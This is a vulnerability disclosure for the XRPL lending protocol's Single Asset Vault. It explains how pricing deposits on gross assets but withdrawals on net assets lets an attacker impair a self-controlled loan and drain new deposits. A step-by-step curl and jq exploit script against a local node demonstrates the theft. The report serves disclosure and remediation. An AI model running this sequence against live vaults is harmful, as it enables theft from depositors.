# Critical: Single Asset Vault share valuation mismatch enables theft of new deposits

## Description

### Brief/Intro
Single Asset Vault (SAV) deposits mint shares using the vault's **gross** assets (`sfAssetsTotal`), while withdrawals and clawbacks redeem shares against **net** assets (`sfAssetsTotal - sfLossUnrealized`). An attacker can impair a self-controlled loan to inflate `sfLossUnrealized`, accept victim deposits priced at the higher gross value, and later redeem legacy shares using the lower net valuation. The spread is taken from new depositors, leaving their shares under-collateralized without tripping invariants.

### Vulnerability Details
- `assetsToSharesDeposit` divides the incoming asset amount by `sfAssetsTotal` without subtracting `sfLossUnrealized`. Deposits are always priced against gross assets.【F:src/libxrpl/ledger/View.cpp†L3470-L3494】【F:src/xrpld/app/tx/detail/VaultDeposit.cpp†L238-L283】
- In contrast, both redemption helpers (`assetsToSharesWithdraw`, `sharesToAssetsWithdraw`) subtract `sfLossUnrealized` before computing exchange ratios, so redemptions use net asset value.【F:src/libxrpl/ledger/View.cpp†L3526-L3577】
- Loan impairment treats the entire outstanding vault receivable as an unrealized loss (`sfLossUnrealized += owedToVault`). An attacker-controlled borrower can impair their own loan to raise the loss figure while legacy shares keep their original gross pricing.【F:src/xrpld/app/tx/detail/LoanManage.cpp†L136-L337】
- Because deposits ignore the loss, new entrants mint shares at face value even when the vault is economically insolvent. Later withdrawals/clawbacks use net asset pricing, transferring the delta to existing holders.

### Impact Details
1. Attacker seeds the vault with a deposit (minting fully collateralized shares).
2. They originate and immediately impair a self-controlled loan so that `sfLossUnrealized` equals the borrowed amount while `sfAssetsTotal` stays unchanged.
3. Victims deposit fresh assets. Deposit math still references `sfAssetsTotal`, so victims receive shares worth the full amount despite the vault's net asset value being zero.
4. The attacker redeems their original shares. Redemption uses net assets, so they extract half of the victim's deposit while also keeping the loan proceeds. Victim shares are now worth pennies on the dollar until the loss is realized.

### Severity and in-scope impact mapping
- **Severity:** Critical
- **Impacts:**
  - Theft of funds from vault objects / first-loss capital reserves
  - Direct loss of funds to honest participants

### Recommended Mitigation
- Use consistent share pricing across deposit, withdraw, and clawback flows. Either subtract `sfLossUnrealized` in deposit math or add unrealized losses back into redemption paths so deposits and redemptions agree on valuation.
- Add regression tests covering deposits while `sfLossUnrealized > 0` to prevent future drift.
- Consider temporarily blocking new deposits while `sfLossUnrealized` is non-zero so retail users cannot be diluted by stale impairments.

## References
- `src/libxrpl/ledger/View.cpp` (`assetsToSharesDeposit`, `sharesToAssetsWithdraw`)
- `src/xrpld/app/tx/detail/VaultDeposit.cpp`
- `src/xrpld/app/tx/detail/LoanManage.cpp`

## Proof of Concept
This JSON-RPC walkthrough reproduces the theft against a local standalone node. It uses shell utilities (`curl`, `jq`, `python3`) that ship with the repo's dev container.

> **Prerequisites**
> - C++ toolchain capable of building `rippled`
> - Python 3.11+, `jq`

### 1. Build and start `rippled`
```bash
cd attackathon-xrpl-lending-protocol
mkdir -p .build
cd .build
conan profile detect
conan remote add --index 0 xrplf https://conan.ripplex.io
conan install .. --output-folder . --build missing --settings build_type=Release
cmake -DCMAKE_TOOLCHAIN_FILE=build/generators/conan_toolchain.cmake -DCMAKE_BUILD_TYPE=Release -Dxrpld=ON ..
cmake --build . -j$(nproc)
cp ../cfg/rippled-example.cfg rippled.cfg
./rippled -a --start --conf rippled.cfg
```
Leave the daemon running and open a second terminal for the remaining steps.

### 2. Deterministic wallets and funding
```bash
cd attackathon-xrpl-lending-protocol
export RIPPLE_RPC=http://127.0.0.1:5005

for name in issuer broker borrower attacker victim; do
  curl -s $RIPPLE_RPC -d '{
    "method":"wallet_propose",
    "params":[{"passphrase":"sav poc '"$name"'"}]
  }' > ${name}_wallet.json
  export "$(jq -r '.result | "'"${name^^}"'_ACCOUNT=" + .account_id + "\n'"${name^^}"'_SECRET=" + .master_seed' ${name}_wallet.json)"
done

for acct in "$ISSUER_ACCOUNT" "$BROKER_ACCOUNT" "$BORROWER_ACCOUNT" "$ATTACKER_ACCOUNT" "$VICTIM_ACCOUNT"; do
  curl -s $RIPPLE_RPC -d '{
    "method":"submit",
    "params":[{
      "secret":"snoPBrXtMeMyMHUVTgbuqAfg1SUTb",
      "tx_json":{
        "TransactionType":"Payment",
        "Account":"rHb9CJAWyB4rj91VRWn96DkukG4bwdtyTh",
        "Destination":"'$acct'",
        "Amount":"100000000000"
      }
    }]
  }' | jq '.result.engine_result'
done
```

### 3. USD trust lines and initial liquidity
```bash
for holder in "$BROKER_ACCOUNT" "$BORROWER_ACCOUNT" "$ATTACKER_ACCOUNT" "$VICTIM_ACCOUNT"; do
  curl -s $RIPPLE_RPC -d '{
    "method":"submit",
    "params":[{
      "secret":"'"$(eval echo \$${holder#?}_SECRET)"'",
      "tx_json":{
        "TransactionType":"TrustSet",
        "Account":"'$holder'",
        "LimitAmount":{
          "currency":"USD",
          "issuer":"'$ISSUER_ACCOUNT'",
          "value":"1000000000"
        },
        "Flags":262144
      }
    }]
  }' | jq '.result.engine_result'
done

for dest in "$BROKER_ACCOUNT" "$ATTACKER_ACCOUNT" "$VICTIM_ACCOUNT"; do
  curl -s $RIPPLE_RPC -d '{
    "method":"submit",
    "params":[{
      "secret":"'$ISSUER_SECRET'",
      "tx_json":{
        "TransactionType":"Payment",
        "Account":"'$ISSUER_ACCOUNT'",
        "Destination":"'$dest'",
        "Amount":{
          "currency":"USD",
          "issuer":"'$ISSUER_ACCOUNT'",
          "value":"1000"
        },
        "Flags":131072
      }
    }]
  }' | jq '.result.engine_result'
done
```

### 4. Create the vault and loan broker
```bash
VAULT_HASH=$(curl -s $RIPPLE_RPC -d '{
  "method":"submit",
  "params":[{
    "secret":"'$BROKER_SECRET'",
    "tx_json":{
      "TransactionType":"VaultCreate",
      "Account":"'$BROKER_ACCOUNT'",
      "Asset":{"currency":"USD","issuer":"'$ISSUER_ACCOUNT'"},
      "Scale":6
    }
  }]
}' | jq -r '.result.tx_json.hash')

VAULT_ID=$(curl -s $RIPPLE_RPC -d '{"method":"tx","params":[{"transaction":"'$VAULT_HASH'"}]}' |
  jq -r '.result.meta.AffectedNodes[] | select(.CreatedNode? and .CreatedNode.LedgerEntryType=="Vault").CreatedNode.LedgerIndex')

echo "VaultID=$VAULT_ID"

BROKER_HASH=$(curl -s $RIPPLE_RPC -d '{
  "method":"submit",
  "params":[{
    "secret":"'$BROKER_SECRET'",
    "tx_json":{
      "TransactionType":"LoanBrokerSet",
      "Account":"'$BROKER_ACCOUNT'",
      "VaultID":"'$VAULT_ID'",
      "CoverRateMinimum":1
    }
  }]
}' | jq -r '.result.tx_json.hash')

LOANBROKER_ID=$(curl -s $RIPPLE_RPC -d '{"method":"tx","params":[{"transaction":"'$BROKER_HASH'"}]}' |
  jq -r '.result.meta.AffectedNodes[] | select(.CreatedNode? and .CreatedNode.LedgerEntryType=="LoanBroker").CreatedNode.LedgerIndex')

echo "LoanBrokerID=$LOANBROKER_ID"
```

### 5. Seed attacker shares and record baseline
```bash
curl -s $RIPPLE_RPC -d '{
  "method":"submit",
  "params":[{
    "secret":"'$ATTACKER_SECRET'",
    "tx_json":{
      "TransactionType":"VaultDeposit",
      "Account":"'$ATTACKER_ACCOUNT'",
      "VaultID":"'$VAULT_ID'",
      "Amount":{"currency":"USD","issuer":"'$ISSUER_ACCOUNT'","value":"100"}
    }
  }]
}' | jq '.result.engine_result'

curl -s $RIPPLE_RPC -d '{"method":"ledger_entry","params":[{"index":"'$VAULT_ID'"}]}' > vault_after_seed.json
SHARE_MPT_ID=$(jq -r '.result.node.ShareMPTID' vault_after_seed.json)

curl -s $RIPPLE_RPC -d '{
  "method":"ledger_entry",
  "params":[{"mptoken":{"account":"'$ATTACKER_ACCOUNT'","mpt_issuance_id":"'$SHARE_MPT_ID'"}}]
}' > attacker_shares_seed.json
```

### 6. Originate an attacker-controlled loan and impair it
```bash
cat > loan_template.json <<'EOJSON'
{
  "TransactionType":"LoanSet",
  "Account":"$BROKER_ACCOUNT",
  "LoanBrokerID":"$LOANBROKER_ID",
  "Counterparty":"$BORROWER_ACCOUNT",
  "PrincipalRequested":{"currency":"USD","issuer":"$ISSUER_ACCOUNT","value":"100"},
  "PaymentInterval":604800,
  "PaymentTotal":4,
  "Fee":"0",
  "SigningPubKey":""
}
EOJSON

COUNTER_SIG=$(./.build/rippled --conf rippled.cfg sign "$BORROWER_SECRET" "$(cat loan_template.json)" offline CounterpartySignature |
  jq -r '.result.tx_json.CounterpartySignature')

BROKER_SEQ=$(curl -s $RIPPLE_RPC -d '{"method":"account_info","params":[{"account":"'$BROKER_ACCOUNT'"}]}' |
  jq -r '.result.account_data.Sequence')

jq ".CounterpartySignature = $COUNTER_SIG | .Sequence = $BROKER_SEQ" loan_template.json > loan_final.json
SIGNED_LOAN=$(./.build/rippled --conf rippled.cfg sign "$BROKER_SECRET" "$(cat loan_final.json)" offline true | jq -r '.result.tx_blob')

curl -s $RIPPLE_RPC -d '{"method":"submit","params":[{"tx_blob":"'$SIGNED_LOAN'"}]}' > loan_submit.json
LOAN_ID=$(curl -s $RIPPLE_RPC -d '{"method":"tx","params":[{"transaction":"'$(jq -r '.result.tx_json.hash' loan_submit.json)'"}]}' |
  jq -r '.result.meta.AffectedNodes[] | select(.CreatedNode? and .CreatedNode.LedgerEntryType=="Loan").CreatedNode.LedgerIndex')

echo "LoanID=$LOAN_ID"

curl -s $RIPPLE_RPC -d '{
  "method":"submit",
  "params":[{
    "secret":"'$BROKER_SECRET'",
    "tx_json":{
      "TransactionType":"LoanManage",
      "Account":"'$BROKER_ACCOUNT'",
      "LoanID":"'$LOAN_ID'",
      "Flags":131072
    }
  }]
}' | jq '.result.engine_result'

curl -s $RIPPLE_RPC -d '{"method":"ledger_entry","params":[{"index":"'$VAULT_ID'"}]}' > vault_after_impair.json
```

### 7. Victim deposit ignoring the unrealized loss
```bash
curl -s $RIPPLE_RPC -d '{
  "method":"submit",
  "params":[{
    "secret":"'$VICTIM_SECRET'",
    "tx_json":{
      "TransactionType":"VaultDeposit",
      "Account":"'$VICTIM_ACCOUNT'",
      "VaultID":"'$VAULT_ID'",
      "Amount":{"currency":"USD","issuer":"'$ISSUER_ACCOUNT'","value":"100"}
    }
  }]
}' | jq '.result.engine_result'

curl -s $RIPPLE_RPC -d '{"method":"ledger_entry","params":[{"index":"'$VAULT_ID'"}]}' > vault_after_victim.json
curl -s $RIPPLE_RPC -d '{"method":"ledger_entry","params":[{"mpt_issuance":"'$SHARE_MPT_ID'"}]}' > share_issuance_after_victim.json
curl -s $RIPPLE_RPC -d '{"method":"ledger_entry","params":[{"mptoken":{"account":"'$VICTIM_ACCOUNT'","mpt_issuance_id":"'$SHARE_MPT_ID'"}}]}' > victim_shares_pre.json
curl -s $RIPPLE_RPC -d '{"method":"ledger_entry","params":[{"mptoken":{"account":"'$ATTACKER_ACCOUNT'","mpt_issuance_id":"'$SHARE_MPT_ID'"}}]}' > attacker_shares_pre.json
```

### 8. Attacker redeems legacy shares at net asset value
```bash
ATTACKER_SHARES=$(jq -r '.result.node.MPTAmount.value' attacker_shares_pre.json)

curl -s $RIPPLE_RPC -d '{
  "method":"account_lines",
  "params":[{"account":"'$ATTACKER_ACCOUNT'","peer":"'$ISSUER_ACCOUNT'"}]}' > attacker_lines_before.json

curl -s $RIPPLE_RPC -d '{
  "method":"submit",
  "params":[{
    "secret":"'$ATTACKER_SECRET'",
    "tx_json":{
      "TransactionType":"VaultWithdraw",
      "Account":"'$ATTACKER_ACCOUNT'",
      "VaultID":"'$VAULT_ID'",
      "Amount":{"value":"'$ATTACKER_SHARES'","mpt_issuance_id":"'$SHARE_MPT_ID'"}
    }
  }]
}' | jq '.result.engine_result'

curl -s $RIPPLE_RPC -d '{"method":"account_lines","params":[{"account":"'$ATTACKER_ACCOUNT'","peer":"'$ISSUER_ACCOUNT'"}]}' > attacker_lines_after.json
curl -s $RIPPLE_RPC -d '{"method":"ledger_entry","params":[{"index":"'$VAULT_ID'"}]}' > vault_after_withdraw.json
curl -s $RIPPLE_RPC -d '{"method":"ledger_entry","params":[{"mptoken":{"account":"'$ATTACKER_ACCOUNT'","mpt_issuance_id":"'$SHARE_MPT_ID'"}}]}' > attacker_shares_post.json
curl -s $RIPPLE_RPC -d '{"method":"ledger_entry","params":[{"mptoken":{"account":"'$VICTIM_ACCOUNT'","mpt_issuance_id":"'$SHARE_MPT_ID'"}}]}' > victim_shares_post.json
```

### 9. Quantify the theft
```bash
python3 - <<'PY'
import json, decimal

D = decimal.Decimal

def load(path):
    with open(path) as fh:
        return json.load(fh)

vault_seed = load('vault_after_seed.json')['result']['node']
vault_impair = load('vault_after_impair.json')['result']['node']
vault_victim = load('vault_after_victim.json')['result']['node']
vault_final = load('vault_after_withdraw.json')['result']['node']
issuance = load('share_issuance_after_victim.json')['result']['node']
attacker_before = load('attacker_lines_before.json')['result']['lines'][0]
attacker_after = load('attacker_lines_after.json')['result']['lines'][0]
attacker_shares_pre = load('attacker_shares_pre.json')['result']['node']
attacker_shares_post = load('attacker_shares_post.json')['result']['node']
victim_shares_pre = load('victim_shares_pre.json')['result']['node']

shares_total = D(issuance['OutstandingAmount']['value'])
net_assets = D(vault_victim['AssetsTotal']) - D(vault_victim['LossUnrealized'])
price_deposit = D(vault_victim['AssetsTotal']) / shares_total
price_redeem = net_assets / shares_total

print(f"Deposit pricing (gross): {price_deposit} per share")
print(f"Redemption pricing (net): {price_redeem} per share")

attacker_gain = D(attacker_after['balance']) - D(attacker_before['balance'])
print(f"Attacker IOU balance increase: {attacker_gain}")
print(f"Attacker shares before withdraw: {attacker_shares_pre['MPTAmount']['value']}")
print(f"Attacker shares after withdraw: {attacker_shares_post['MPTAmount']['value']}")
print(f"Victim share balance: {victim_shares_pre['MPTAmount']['value']}")
print(f"Vault final totals: AssetsTotal={vault_final['AssetsTotal']}, LossUnrealized={vault_final['LossUnrealized']}")
PY
```

**Expected outcome**
- Step 7 shows the victim deposit succeeding even though `LossUnrealized` already equals the vault's gross assets (`sfLossUnrealized = sfAssetsTotal`).
- The Python summary reports the gross share price (`1.0`) and net redemption price (`0.5`), proving deposits overpay versus withdrawals.
- `Attacker IOU balance increase` is `50`, matching the half-share theft while the attacker also retains the 100-unit loan proceeds. The victim's share balance remains 100 shares valued at only 50 net assets.

This confirms an attacker can deterministically drain new deposits by inflating `sfLossUnrealized` before accepting victims.
